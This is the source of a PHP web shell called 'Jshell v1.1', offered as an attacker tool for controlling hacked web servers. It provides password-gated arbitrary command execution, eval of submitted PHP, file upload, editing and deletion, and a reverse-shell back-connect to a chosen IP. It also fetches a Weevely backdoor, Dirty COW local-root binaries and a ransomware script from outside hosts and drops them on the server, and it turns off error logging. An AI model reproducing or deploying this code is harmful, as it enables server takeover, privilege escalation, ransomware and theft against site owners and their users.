<?php 
/**
* [ Jshell v1.1 - 2018. ]
* 
* @author shutdown57 ( alinko ) < alinkokomansuby@gmail.com >
* @version 1.0 2018
* @link page  : https://facebook.com/fp.javcode
* @link group : https://facebook.com/groups/jc.javcode
* @see https://github.com/alintamvanz ( alintamvanz )
* @see https://pastebin.com/u/shutdown57 ( shutdown57 )
* @copyright &copy; 2018 JavCode.
*
**/
$config = [
		'title' => 'Jshell v1.1', // set title name. 
    'debug' => true, // if debug true is any error showed.
		'icon' => 'http://alintamvanz.github.io/jshell/javcode-grey.png',
    'src_jquery' => 'http://alintamvanz.github.io/jshell/jquery.min.js',
    'src_datatables' => 'http://alintamvanz.github.io/jshell/jquery.dataTables.js',
    'src_style' => 'http://alintamvanz.github.io/jshell/style-js.css',
];

Class Jshell{
	public $menubar;
  public $src_link;
  public $password;
 public function __construct()
 {
 	/** The script started here. **/
$this->password = 'w'; // password 

if($config['debug'] === true)
  { error_reporting(-1); }else{ error_reporting(0); }
error_log(0);
session_start();
ob_start();
set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

// login authetication
if(empty($_SESSION['jshell']))
{
  echo "<center><h3>Jshellv1 - 2018</h3><form method=post><input type=password name=passw placeholder=password><input type=submit value=Go></form></center>";
  if(isset($_POST['passw']))
  {
    if($_POST['passw'] == $this->password)
    {
      $_SESSION['jshell'] = true;
      echo "<meta http-equiv=refresh content=0;url=?login=".$this->password.">";
    }
  }
  exit;
}

  $GLOBALS['getfullpath'] = (empty($_GET['jshell_path'])) ? getcwd() : $_GET['jshell_path'];
  @chdir($GLOBALS['getfullpath']);
  $baselink = "?jshell_path=".$GLOBALS['getfullpath']."&jshell_act=";
 	$this->menubar = [
 	'Home' => $_SERVER['PHP_SELF'],
	'Upload' => $baselink.'upl',
  'Command' => $baselink.'cmd',
  'Localroot' => $baselink.'lc',
  'Back Connect' => $baselink.'net',
  'PHP' => $baselink.'php',
  'Weevely' => $baselink.'wev',
  'Ransomware' => $baselink.'rans',];

  $this->src_link = [
    'adminer' => '',
    'weevely' => 'https://raw.githubusercontent.com/alintamvanz/alintamvanz.github.io/master/jshell/Jweevely.php',
    'mailer' => '',
    'lc' => [
      'dirty' => 'https://github.com/alintamvanz/localroot/raw/master/dirtycow-mem',
      'c0w' => 'https://github.com/alintamvanz/localroot/raw/master/c0w',
      'cowroot' => 'https://github.com/alintamvanz/localroot/raw/master/cowroot',
    ],
    'ransomware' => 'https://pastebin.com/raw/JfzDnXK3',
  ];
 

}
 public function Jcmd($cmd) { 
if(function_exists('system')) {     
    @ob_start();    
    @system($cmd);    
    $exect = @ob_get_contents();    
    @ob_end_clean();    
    return $exect;  
  } elseif(function_exists('exec')) {     
    @exec($cmd,$results);     
    $exect = "";    
    foreach($results as $result) {      
      $exect .= $result;    
    } return $exect;  
  } elseif(function_exists('passthru')) {     
    @ob_start();    
    @passthru($cmd);    
    $exect = @ob_get_contents();    
    @ob_end_clean();    
    return $exect;  
  } elseif(function_exists('shell_exec')) {     
    $exect = @shell_exec($cmd);     
    return $exect;  
  } 
}
public function Jgetgrowif()
{
  if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
  } else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];$uid = $uid['uid'];
    $group = $gid['name'];$gid = $gid['gid'];
  }
  $r = ['user' => $user,'uid' => $uid,'group' => $group,'gid' => $gid];
  return $r;
}
 public function Jserverinfo()
 {
  $mysql = (function_exists('mysql_connect')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $mysqli = (function_exists('mysqli_connect')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $wget = ($this->Jcmd('wget --help')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $curl = (function_exists('curl_init')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $perl = ($this->Jcmd('perl --help')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $python = ($this->Jcmd('python --help')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $bash = ($this->Jcmd('bash --version')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $gcc = ($this->Jcmd('gcc --help')) ? "<font color=lime>YES</font>" :"<font color=red>NO</font>";
  $sm = (ini_get('safe_mode') == 'on') ? "<font color=lime>YES</font>" : "<font color=red>NO</font>"; 
  $df = (ini_get('disable_functions')) ? wordwrap(ini_get('disable_functions'),100,"\n",true) : "<font color=red>NO !</font>";
  $sysfo = [
    'hostname' => $_SERVER['HTTP_HOST'],
    'system' => php_uname(),
    'phpv' => phpversion(),
    'software' => $_SERVER['SERVER_SOFTWARE'],
    'ipserver' => gethostbyname($_SERVER['HTTP_HOST']),
    'ipclient' => $_SERVER['REMOTE_ADDR'],
    'mysql' => $mysql,
    'mysqli' => $mysqli,
    'wget' => $wget,
    'curl' => $curl,
    'perl' => $perl,
    'python' => $python,
    'bash' => $bash,
    'gcc' => $gcc,
    'safemode' => $sm,
    'disafunc' => $df];
    return $sysfo;
 }
 public function Jcurdir($path,$goto){
  $dir = str_replace("\\","/",$path);
  $dir = explode("/",$dir);
  foreach($dir as $o=>$i){
    if($i == "" && $o == 0){
      echo "<a href=\"javascript:menuklik('?".$goto."=/')\">/</a>";continue;}
      if($i == "")continue;
      echo "<a href=\"javascript:menuklik('?".$goto."=";
      for($p=0;$p<=$o;$p++){ 
        echo $dir[$p]; if($p != $o){
          echo "/";} } echo "')\">".$i."</a>/";}
          if(is_writable($path)){echo "- [<b><font color=lime>W</font></b>]";}elseif(is_readable($path)){echo "- [<b><font color=red>R</font></b>]";}else{echo "- [<b><font color=grey>Unknown</font></b>]<meta http-equiv='refresh' content='4;url=?'>";}}
 public function Jcaller($url,$name)
 {
$fp = fopen($name,"w");
$co = file_get_contents($url);
return fwrite($fp,$co);
fclose($fp);
 }
 public function Jheader($config = array())
 {
 	?>
 	<!DOCTYPE html>
 	<html>
 	<head>
 		<title><?=$config['title'];?> [<?=$_SERVER['HTTP_HOST'];?>]</title>
 		<meta charset="utf-8">
 		<meta name="author" content="shutdown57">
 		<link rel="icon" type="text/css" href="<?=$config['icon'];?>">
 		<script type="text/javascript" src="<?=$config['src_jquery'];?>"></script>
		<script type="text/javascript" src="<?=$config['src_datatables'];?>"></script>
  		<!-- <link rel="stylesheet" type="text/css" href="valid/assets/css/w3.css"> -->
    <link rel="stylesheet" type="text/css" href="<?=$config['src_style'];?>">
  		<script type="text/javascript">
  			function select_all(pilih)
  			{
  				var cek = document.getElementsByName('pilih[]');
  				for (var i =0; n=cek.length;i++) {
  					cek[i].checked = pilih.checked;
  				}
  			}
        function logout()
        {
          $.ajax({
            url:'?jshell_act=logout',
            success:function(e)
            {
              alert('Bye Boyz!');
              window.location.href='';
            }
          });
        }
        function menuklik(uri)
        {
          $('.right').html("<img src='https://dfw.ink/images/loading_gif.gif' style='width:50px;height:50px;'>");
          history.pushState(null,null,uri);
          $.ajax({
            url:uri,
            success:function(e)
            {
              $('body').html(e);
            },error:function(e)
            {
              alert('Something wrong :D '+e);
            }
          });
        }
        function rename(dir,file)
        {
          var newname = prompt('New name');
          if(newname != null){
            window.location.href='?jshell_path='+dir+'&jshell_file='+file+'&n='+newname+'&jshell_act=ren';
          }else{
            alert('Nama file masih kosong');
          }
        }
        function hs(l,p)
        {
          document.getElementById(l).style.display='none';
          document.getElementById(p).style.display='block';
        }
        function gotodir(dir)
        {
          var dire = $(dir).val();
          $.ajax({
            url:'?jshell_path='+dire,
            success:function(e)
            {
              $('body').html(e);
              history.pushState(null,null,'?jshell_path='+dire);
            },error:function(e)
            {
              alert('error '+e);
            }
          });
        }
  			$(document).ready(function()
 			{
        $('body').hide().fadeIn(500);
 				$('#filemanager').DataTable({
 					'bSort':false,
 				});
 			});
  		</script>
 	</head>
 	<body onload="faded(this)">
 		<div class="w3-container">

 		<header>
      <div class="right"></div>
 			<table class="table" style="width: 98%;margin: 0 auto;border-left: 1px dashed #eee;border-right: 1px dashed #f00;border-top: 1px dashed #f00;border-bottom: 1px dashed #eee;">
 				<tr><td style="width: 200px;" class="kiri"><center><img src="https://s19.postimg.cc/jcxygcm1v/javcode-grey.png" style="max-width: 170px;max-height:170px;" ><p><?=$config['title'];?> | by : JavCode.</p></center></td><td>
<pre>
System : <?=$this->Jserverinfo()['system'];?> [Exploit-DB] [Search Localroot]
Hostname : <?=$this->Jserverinfo()['hostname'];?> | Safe Mode : <?=$this->Jserverinfo()['safemode'];?> .
Server Software : <?=$this->Jserverinfo()['software'];?>.
PHP Version : <?=$this->Jserverinfo()['phpv'];?> - [<a href="javascript:menuklik('?jshell_path=<?=$GLOBALS[getfullpath]?>&jshell_act=phpinfo');">phpinfo</a>] [<a href="javascript:menuklik('?jshell_path=<?=dirname(php_ini_loaded_file());?>&jshell_file=<?=basename(php_ini_loaded_file());?>&jshell_act=view');">php.ini</a>]
IP Server : <?=$this->Jserverinfo()['ipserver'];?> | IP Client : <?=$this->Jserverinfo()['ipclient'];?>.
HDD : 31.89 / 180.16 GB | [ Free : 148.27 GB ]
User : <?=$this->Jgetgrowif()['user'];?> [<?=$this->Jgetgrowif()['uid'];?>] || Group : <?=$this->Jgetgrowif()['group'];?> [<?=$this->Jgetgrowif()['gid'];?>]
MySQL : <?=$this->Jserverinfo()['mysql'];?> | MySQLi : <?=$this->Jserverinfo()['mysqli'];?> | Wget : <?=$this->Jserverinfo()['wget'];?> | CURL : <?=$this->Jserverinfo()['curl'];?> | Perl : <?=$this->Jserverinfo()['perl'];?> | Python : <?=$this->Jserverinfo()['python'];?> | Bash : <?=$this->Jserverinfo()['bash'];?> | GCC ( compiler ) : <?=$this->Jserverinfo()['gcc'];?>.
Disable functions : <?=$this->Jserverinfo()['disafunc'];?>
          </pre>
        </td>
      </tr>
    </table>
    <div style="margin-left:10px;margin: 4px;">
    <div id="cd">
 		<a href="javascript:hs('cd','dc');">Current dir</a> ::  <?= $this->Jcurdir($GLOBALS['getfullpath'],'jshell_path');?>
    </div>
    <div id="dc" style="display: none;">
        <label>Go to dir :: </label>
        <input type="text" id="gtd" value="<?=$GLOBALS['getfullpath'];?>" class="input_m"><input type="button" value=">>" onclick="gotodir('#gtd')" class="submit_m">
    </div>
  </div>
      <ul align=center>
 <?php
 foreach($this->menubar as $menu=>$link){
  echo '<li>[<a href="#" onclick="menuklik(\''.$link.'\');" >'.$menu.'</a>]</li>';
	}
	?>
  [<a href="#" onclick="logout()"><font color=red>Logout</font></a>]
  </ul>
 		</header><br/><br/>
 		<h1></h1>
    <?php
 }
 public function Jsdir($dir)
 {
 	 // Check if scandir() exist in server.
 	if(function_exists('scandir'))
 	{
 		$s = scandir($dir);
 	}
 	return $s;
 }
 public function Jgetfsize($files) // function for get file size.
 {
 	$size = filesize($files)/1024;
 	$size = round($size,3);
 	if($size > 1024){
 		$size = round($size/1024,2). 'MB';
 	} else {
 		$size = $size. 'KB';}
 		return $size;
 }
 public function Jgetmime($files) // function for get mime content type
 {
 	if(function_exists('mime_content_type'))
 	{
 		if(is_readable($files)){
 		$mime =mime_content_type($files);
 		}else{
 		$mime = "Unknown";
 		}
 	}else{
 		if(is_file($files))
 		{
 			$mime = "Files";
 		}elseif (is_dir($files)) {
 			$mime = "Directory";
 		}else{
 			$mime = "Unknown";
 		}
 	}
 	return $mime;
 }
 public function Jvf($f){
  $file = wordwrap(file_get_contents($f),150,"\n",true);
  $a= highlight_string($file,true);
  $old = array("0000BB","000000","FF8000","DD0000", "007700");
  $new = array("F73D80","e1e1e1", "05f6fa", "F9FF00" , "1dff1b");
  $a= str_ireplace($old,$new, $a);
  $result = "<div class=\"code\">";$result .= $a;$result.="</div>";
  return $result;}
 public function Jdel($dir){
  if(is_dir($dir)){
    if(!rmdir($dir)){
      $s=scandir($dir);
      foreach ($s as $ss) {
        if(is_file($dir."/".$ss)){
          if(unlink($dir."/".$ss)){
            $rm=rmdir($dir);
          }
        }
        if(is_dir($dir."/".$ss)){
          $rm=rmdir($dir."/".$ss);
          $rm.=rmdir($dir);
        }
      }
  }elseif(is_file($dir)){
    $rm = unlink($dir);
  }
}elseif(is_file($dir))
{
  $rm = unlink($dir);
}
return $rm;
}
 public function Jupl($a,$b){
  if(function_exists('move_uploaded_file')){
    $upl = move_uploaded_file($a,$b);
  }elseif (function_exists('copy')) { 
    $upl = copy($a,$b);
  }
    return $upl; 
  }
  public function array_upload($file){ 
    $file_ary = array(); 
    $file_count = count($file['name']);
     $file_key = array_keys($file); 
     for($i=0;$i<$file_count;$i++) { 
      foreach($file_key as $val) { 
        $file_ary[$i][$val] = $file[$val][$i]; 
      } 
    } 
    return $file_ary;
  }
 public function Jgetdmod($files) // function for get date modified.
 {
 	$a_fdm=@date("d-m-Y H:i:s", filemtime($files));
 	return $a_fdm;
 }
 public function Jgetowner($path){
 	if(function_exists('posix_getpwuid')) {
 		$downer = @posix_getpwuid(fileowner($path));
 		$downer = $downer['name'];
 	} else {
 		$downer = fileowner($path);
 	}
 	return $downer;
 }
 public function Jgetgroup($path){
 	if(function_exists('posix_getgrgid')) {
 		$dgrp = @posix_getgrgid(filegroup($path));
 		$dgrp = $dgrp['name'];
 	} else { 
 		$dgrp = filegroup($path);
 	}
 	return $dgrp;}
  public function Jwrite($fname,$content)
  {
    $fp = fopen($fname,'w');
    fwrite($fp,$content);
    fclose($fp);
  }
 public function Jgetperms($file){
 	$perms = fileperms($file);
 	if (($perms & 0xC000) == 0xC000) {
 		$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info;}

 	public function Jgetact($dir,$file)
 	{
 		$act_files = [
 			'delete' => '?jshell_path='.$dir.'&jshell_file='.$file.'&jshell_act=del',
 			'edit' => '?jshell_path='.$dir.'&jshell_file='.$file.'&jshell_act=edit',
      'download' => '?jshell_path='.$dir.'&jshell_file='.$file.'&jshell_act=dl',
 		 		];
 		$act_dirs = [
 			'delete' => '?jshell_path='.$dir.'&jshell_act=del',
 			];
 		$a ='| ';
 		if(is_file($dir.'/'.$file))
 		{
 			foreach($act_files as $val=>$link)
 			{
        $getap = explode("jshell_act=",$link);
        $getap= $getap[1];
        $title = str_replace(['ren','del','edit','dl'],['rename file : '.$file,'delete file : '.$file,'edit file : '.$file,'download file : '.$file],$getap);
 				$a.= '<a href="#" onclick="menuklik(\''.$link.'\')" title="'.$title.'">'.$val.'</a> | ';
 			}
      $a.= '<a href="#" onclick="rename(\''.$dir.'\',\''.$file.'\')" title="rename file : '.$file.'">rename</a> | ';
 		}elseif(is_dir($dir.'/'.$file))
 		{
 			foreach($act_dirs as $val=>$link)
 			{$getap = explode("jshell_act=",$link);
        $getap= $getap[1];
        $title = str_replace(['ren','del','edit','dl'],['rename file : '.$file,'delete file : '.$file,'edit file : '.$file,'download file : '.$file],$getap);
 				$a.= '<a href="#" onclick="menuklik(\''.$link.'\')" title="'.$title.'">'.$val.'</a> | ';
 			}
      $a.= '<a href="#" onclick="rename(\''.$dir.'\',\''.$file.'\')" title="rename dir : '.$file.'">rename</a> | ';
 		}
 		return $a;
 	}
  public function Jtitle($text)
  {
    echo "<center><h3 class=\"titleac\">..:: ".$text." ::..</h3></center><br/>";
  }
 public function Jfileman($path)
 {
 	?>
  <form method="post">
 	<table class="a_exp" id="filemanager" style="margin-top: 0px">
 		<thead>
 			<tr><th><input type="checkbox" name="pilih[]" onclick="select_all(this)"></th>
 				<th>Files</th>
 				<th>Size</th>
 				<th>Type</th>
 				<th>Date Modif</th>
 				<th>Owner:Group</th>
 				<th>Permission</th>
 				<th>Action</th>
 			</tr>
 		</thead>
 		<tbody>
 			<tr><td></td><td><a href="#" onclick="menuklik('?jshell_path=<?=dirname($GLOBALS['getfullpath']);?>')"><< Parent directory</a></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
 			<?php
 			/* Scan directory in server */
 			$sdirs = $this->Jsdir($path);
 			foreach($sdirs as $sd)
 			{if(is_file($path.'/'.$sd)||$sd == '.'||$sd == '..')continue;
 				?><tr>
 					<td><input type="checkbox" name="pilih[]" value="<?=$path.'/'.$sd;?>"></td>
 					<td><a href="#" onclick="menuklik('?jshell_path=<?=$path.'/'.$sd;?>')"><?=$sd;?></a></td>
 					<td><?=$this->Jgetfsize($path.'/'.$sd);?></td>
 					<td><?=$this->Jgetmime($path.'/'.$sd);?></td>
 					<td><?=$this->Jgetdmod($path.'/'.$sd);?></td>
 					<td><?=$this->Jgetowner($path.'/'.$sd);?>:<?=$this->Jgetgroup($path.'/'.$sd);?></td>
 					<td><?=$this->Jgetperms($path.'/'.$sd);?></td>
 					<td><?=$this->Jgetact($path,$sd);?></td>

 				</tr>
 				<?php
 			}
 			/* scan files in server */
 			$sfile = $this->Jsdir($path);
 			foreach($sfile as $sf)
 			{if(is_dir($path.'/'.$sf)||$sf == '.'||$sf == '..')continue;
 				?><tr>
 					<td><input type="checkbox" name="pilih[]" value="<?=$path.'/'.$sf;?>"></td>
 					<td><a href="#" onclick="menuklik('?jshell_path=<?=$path;?>&jshell_file=<?=$sf;?>&jshell_act=view')"><?=$sf;?></a></td>
 					<td><?=$this->Jgetfsize($path.'/'.$sf);?></td>
 					<td><?=$this->Jgetmime($path.'/'.$sf);?></td>
 					<td><?=$this->Jgetdmod($path.'/'.$sf);?></td>
 					<td><?=$this->Jgetowner($path.'/'.$sf);?>:<?=$this->Jgetgroup($path.'/'.$sf);?></td>
 					<td><?=$this->Jgetperms($path.'/'.$sf);?></td>
 					<td><?=$this->Jgetact($path,$sf);?></td>

 				</tr>
 				<?php
 			}
 			?>
 		</tbody>
 	</table><div style="clear: both; margin-bottom:69px"></div><table style="bottom: 0;left: 0;position: fixed;"><tr><td>
        Actions</td><td><select name="actionx" class="input_m">
          <option>----[ action ]----</option>
          <option value="delete">Delete</option>
          <?php
          if(empty($_SESSION['cfile'])){
            ?>
          <option value="copy">Copy</option>
          <?php
            }else{
              ?><option value="paste">Paste</option><?php
            }
            ?>
        </select><input type="submit" name="sac" value=">>" class="submit_m">
  </td></tr></table>
</form>
 	<?php
  if(isset($_POST['sac']))
  {
    if($_POST['actionx'] == 'delete')
    {
      foreach($_POST['pilih'] as $dfil)
      {
        if($this->Jdel($dfil))
           echo "<meta http-equiv='refresh' content='0;url=?jshell_path=".$GLOBALS[getfullpath]."'>";
         else
           echo "<meta http-equiv='refresh' content='0;url=?jshell_path=".$GLOBALS[getfullpath]."'>";
      }
    }elseif($_POST['actionx'] == 'copy')
    {
      $_SESSION['cfile'] = $_POST['pilih'];
      echo "<meta http-equiv='refresh' content='0;url=?jshell_path=".$GLOBALS[getfullpath]."'>";
    }elseif($_POST['actionx'] == 'paste')
    {
      foreach($_SESSION['cfile'] as $paste)
      {
        copy($paste,$GLOBALS['getfullpath'].'/'.basename($paste));
      }
      unset($_SESSION['cfile']);
    echo "<meta http-equiv='refresh' content='0;url=?jshell_path=".$GLOBALS[getfullpath]."'>";
    }
  }
 }

 public function Jshell_act($type,$text = null)
 {
  if($type == 'cmd')
  {
    ?>
    <form method="post">
    <label>jshellv1.1 ~ $</label>
    <input type="text" name="cmd" class="input_m" style="width: 500px;"><input type="submit" name="exec" value=">>" class="submit_m">
    </form>
    <?php 
  }elseif($type == 'upl')
  {
    ?>
    <center>
    <form method="post" enctype="multipart/form-data">
      <label>Select file ::</label>
      <input type="file" name="jfilez[]" class="input_m" multiple="">
      <label>Upload to ::</label>
      <input type="text" name="jdirz" value="<?=$GLOBALS['getfullpath'];?>" class="input_m"><input type="submit" name="upload" value="Upload !" class="submit_m">
    </form>
  </center>
    <?php
  }elseif ($type == 'edit') {
    ?>
    <center>
      <form method="post">
        <textarea class="txtarea_m" name="editfile"><?=$text;?></textarea>
        <br/>
        <input type="submit" name="save" value="Save" class="submit_m" style="padding: 10px;width: 200px;cursor: pointer;">
      </form>
    </center>
    <?php
  }elseif($type == 'lc')
  {
    ?>
    <center>
      <form method="get" action="https://google.com/search" target="_blank">
        <label for="q">Search on google</label>
        <input type="text" name="q" placeholder="Search exploit" class="input_m">
        <input type="submit" value=">>" class="submit_m">
      </form>
      <br>
      [<a href="javascript:menuklik('?jshell_path=<?=$_GET['jshell_path'];?>&jshell_act=c0w');">c0w</a>]
      [<a href="javascript:menuklik('?jshell_path=<?=$_GET['jshell_path'];?>&jshell_act=cowroot');">cowroot</a>]
      [<a href="javascript:menuklik('?jshell_path=<?=$_GET['jshell_path'];?>&jshell_act=dirtycow-mem');">dirty-mem</a>]
      [<a href="https://exploit-db.com/local/" target="_blank">localroot ex-db</a>]
    </center>
    <?php
  }elseif($type == 'bc')
  {
    ?><center>
      <form method="post">
        <label for="ip">IP </label>
        <input type="text" name="ip" class="input_m" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <label for="port">Port</label>
        <input type="text" name="port" class="input_m" value="5758">
        <input type="submit" name="sbmt" value=">>" class="submit_m">
      </form>
    </center>
    <?php
  }elseif ($type == 'php') {
    ?>
    <center>
      <form method="post">
        <textarea class="txtarea_m" name="code">echo "hello noob";</textarea><br>
        <input type="submit" name="sbmt" value="Run !" class="submit_m" style="width: 120px">
      </form>
    </center>
    <?php
  }
 }

}


$js = new Jshell;

$js->Jheader($config);
if(empty($_GET['jshell_act']))
{
	$js->Jfileman($GLOBALS['getfullpath']);
}else{
  //000000000000000000000000000000
  $jfilez = @$_GET['jshell_file'];
  $jpaptt = @$_GET['jshell_path'];
  //000000000000000000000000000000
  if($_GET['jshell_act'] == 'del')
  {
    $delt = (empty($jfilez)) ? $jpaptt : $jpaptt.'/'.$jfilez;
    if($js->Jdel($delt)){
    echo "<b> Successfully deleted files ~ </b>";
    echo "<meta http-equiv='refresh' content='2;url=?jshell_path=".$jpaptt."'>";
    }else{
      echo $delt."<br/>";
      echo "<b> Failed delete files ~ </b>";
    echo "<meta http-equiv='refresh' content='2;url=?jshell_path=".$jpaptt."'>";
    
    }
  }elseif ($_GET['jshell_act'] == 'ren') {
    $fold = $jpaptt.'/'.$jfilez;
    $fnew = $jpaptt.'/'.$_GET['n'];
    if(@rename($fold,$fnew))
    {
    echo "<b> Successfully rename files ~ </b>";
    echo "<meta http-equiv='refresh' content='2;url=?jshell_path=".$jpaptt."'>";
    }else{
    echo "<b> Failed rename files ~ </b>";
    echo "<meta http-equiv='refresh' content='2;url=?jshell_path=".$jpaptt."'>";
    }

  }
elseif($_GET['jshell_act'] == 'edit')
{
  $baselink = '?jshell_path='.$jpaptt.'&jshell_file='.$jfilez.'&jshell_act=';
  $js->Jtitle('Edit file');
   echo "<ul>Files :<b> ".$jfilez."</b> | Owner:group : <b>".$js->Jgetowner($jpaptt.'/'.$jfilez).":".$js->Jgetgroup($jpaptt.'/'.$jfilez)."</b> | Permission : <b>".$js->Jgetperms($jpaptt.'/'.$jfilez)."</b> | Date modified : <b>".$js->Jgetdmod($jpaptt.'/'.$jfilez)."</b> | Action :: <li>[<a href=\"javascript:menuklik('".$baselink."edit')\">Edit</a>]</li><li>[<a href=\"javascript:menuklik('".$baselink."del')\">Delete</a>]</li><li>[<a href=\"javascript:rename('".$jpaptt."','".$jfilez."')\">Rename</a>]</li><li>[<a href=\"javascript:menuklik('".$baselink."dl')\">Download</a>]</li></ul>";
  $js->Jshell_act('edit',htmlspecialchars(file_get_contents($jpaptt.'/'.$jfilez)));
  if(isset($_POST['save']))
  {
    $fp = $jpaptt.'/'.$jfilez;
    $content = $_POST['editfile'];
    if($js->Jwrite($fp,$content))
    {
       echo "<b> Successfully Edit files ~ </b>";
    }else{
      echo "<b>Failed Edit files ~ </b>";
    }
  }
}
  elseif ($_GET['jshell_act'] == 'view') {
    $js->Jtitle('View file');
    $baselink = '?jshell_path='.$jpaptt.'&jshell_file='.$jfilez.'&jshell_act=';
    echo "<ul>Files :<b> ".$jfilez."</b> | Owner:group : <b>".$js->Jgetowner($jpaptt.'/'.$jfilez).":".$js->Jgetgroup($jpaptt.'/'.$jfilez)."</b> | Permission : <b>".$js->Jgetperms($jpaptt.'/'.$jfilez)."</b> | Date modified : <b>".$js->Jgetdmod($jpaptt.'/'.$jfilez)."</b> | Action :: <li>[<a href=\"javascript:menuklik('".$baselink."edit')\">Edit</a>]</li><li>[<a href=\"javascript:menuklik('".$baselink."del')\">Delete</a>]</li><li>[<a href=\"javascript:rename('".$jpaptt."','".$jfilez."')\">Rename</a>]</li><li>[<a href=\"javascript:menuklik('".$baselink."dl')\">Download</a>]</li></ul>";
   echo $js->Jvf($jpaptt.'/'.$jfilez); 
  }
  elseif($_GET['jshell_act'] == 'logout')
  {
   session_destroy();
  }elseif ($_GET['jshell_act'] == 'cmd') {
    $js->Jtitle('Command Shell');
    $js->Jshell_act('cmd');
    if(isset($_POST['exec'])){
      echo "<pre class='code'>";
      echo $js->Jcmd($_POST['cmd']);
      echo "</pre>";
    }
  }elseif($_GET['jshell_act'] == 'upl')
  {
    $js->Jtitle('Uploader');
    $js->Jshell_act('upl');
    if(isset($_POST['upload'])){
      echo "<pre class='code'>";
      $file_up = $js->array_upload($_FILES['jfilez']);
      foreach($file_up as $filup){
        if($js->Jupl($filup['tmp_name'],$_POST['jdirz']."/".$filup['name'])){
          $res_upl.="Successfuly Upload file : ".$_POST['jdirz']."/".$filup['name'];
        }else{
          $res_upl.="Failed to upload file !";}
        }
        echo $res_upl."<br/></pre>";
      }
  }elseif ($_GET['jshell_act'] == 'wev') {
    $js->Jtitle('Weevely remote shell backdoor');
    if($js->Jcaller($js->src_link['weevely'],'Jweevely.php'))
    {
      echo "<center><b>Successfuly called <a href='Jweevely.php' target='_blank'>Jweevely.php</a> !!</b><br/>";
      echo "<p>password :: jshellv1 ,<br/> open your terminal and remote weevely :D </p>";
      echo "<pre>$ weevely http://".$_SERVER['HTTP_HOST']."/".dirname($_SERVER['PHP_SELF'])."/Jweevely.php jshellv1 </pre>";
    }else{
      echo "request failed";
    }
   
  }elseif ($_GET['jshell_act'] == 'lc') {
    $js->Jtitle('Localroot');
    $js->Jshell_act('lc');
  }elseif($_GET['jshell_act'] == 'net')
  {
    $js->Jtitle('BackConnect');
    $js->Jshell_act('bc');
    if(isset($_POST['sbmt']))
    {
      $sock=fsockopen($_POST['ip'],$_POST['port']); 
      if($sock)
      {
        echo "<center>Connection estabilished~</center> <br>";
      }else{
        echo "<center>Connection failed</center><br>";
      }
      $js->cmd("/bin/sh -i <&3 >&3 2>&3");
    }
  }elseif($_GET['jshell_act'] == 'rans')
  {
     $js->Jtitle('Ransomware ');
    if($js->Jcaller($js->src_link['ransomware'],'s57rsw.php'))
    {
      echo "<center><b>Successfuly called <a href='s57rsw.php' target='_blank'>s57rsw.php</a> !!</b><br/>";
    }else{
      echo "request failed";
    }
  }elseif($_GET['jshell_act'] == 'php')
  {
    $js->Jtitle('Eval PHP');
    
    if(isset($_POST['sbmt']))
    {
      echo "<hr>";
      @eval($_POST['code']);
      echo "<hr>";
      $js->Jshell_act('php');
    }else{
      $js->Jshell_act('php');
    }
  }
}
?>
